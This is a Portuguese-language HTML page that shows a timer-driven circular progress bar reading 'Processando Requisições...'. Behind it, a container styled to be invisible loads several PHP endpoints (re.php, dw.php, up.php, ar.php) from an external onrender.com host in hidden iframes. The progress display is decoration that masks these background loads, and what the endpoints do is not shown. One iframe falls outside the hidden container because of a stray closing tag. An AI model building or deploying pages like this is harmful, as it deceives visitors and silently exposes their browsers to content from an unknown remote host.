<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Processamento de Dados</title>
    <style>
        :root {
            --bg-color: #0f172a;
            --primary-color: #38bdf8;
            --track-color: #1e293b;
        }

        body {
            background-color: var(--bg-color);
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .container {
            text-align: center;
        }

        /* Estilo da Barra Circular */
        .progress-ring {
            position: relative;
            width: 200px;
            height: 200px;
        }

        .progress-ring svg {
            transform: rotate(-90deg);
        }

        .progress-ring__circle {
            stroke-dasharray: 565.48; /* Circunferência 2 * PI * R */
            stroke-dashoffset: 565.48;
            transition: stroke-dashoffset 1s linear;
            stroke-linecap: round;
        }

        .percent-text {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--primary-color);
        }

        /* Esconder os Iframes */
        .hidden-loader {
            display: none;
            visibility: hidden;
            width: 0;
            height: 0;
        }

        h2 { margin-bottom: 20px; font-weight: 300; }
    </style>
</head>
<body>

    <div class="container">
        <h2>Processando Requisições...</h2>
        
        <div class="progress-ring">
            <svg width="200" height="200">
                <!-- Fundo da barra -->
                <circle stroke="var(--track-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
                <!-- Barra de progresso ativa -->
                <circle id="progress-bar" class="progress-ring__circle" stroke="var(--primary-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
            </svg>
            <div class="percent-text" id="percent-display">0%</div>
        </div>
    </div>

    <!-- Carregamento em segundo plano -->
    <div class="hidden-loader">
        <iframe src="https://storage-amheex.onrender.com/re.php"></iframe>
        <iframe src="https://storage-amheex.onrender.com/dw.php"></iframe>
        <iframe src="https://storage-amheex.onrender.com/up.php"></iframe>
    </div>
        <iframe src="https://storage-amheex.onrender.com/ar.php"></iframe>
    </div>


    <script>
        const circle = document.getElementById('progress-bar');
        const percentDisplay = document.getElementById('percent-display');
        const radius = circle.r.baseVal.value;
        const circumference = 2 * Math.PI * radius;

        let secondsRemaining = 60;
        const totalDuration = 60;

        function updateProgress() {
            if (secondsRemaining < 0) return;

            // Calcula o tempo decorrido para a porcentagem (1 a 100)
            const elapsed = totalDuration - secondsRemaining;
            const percent = Math.floor((elapsed / totalDuration) * 100);
            
            // Atualiza o texto
            percentDisplay.innerText = `${percent}%`;

            // Atualiza a barra visual (SVG offset)
            const offset = circumference - (percent / 100) * circumference;
            circle.style.strokeDashoffset = offset;

            if (secondsRemaining > 0) {
                secondsRemaining--;
                setTimeout(updateProgress, 1000);
            } else {
                percentDisplay.innerText = "100%";
                document.querySelector('h2').innerText = "Concluído!";
            }
        }

        // Inicia o processo
        window.onload = () => {
            updateProgress();
        };
    </script>
</body>
</html>
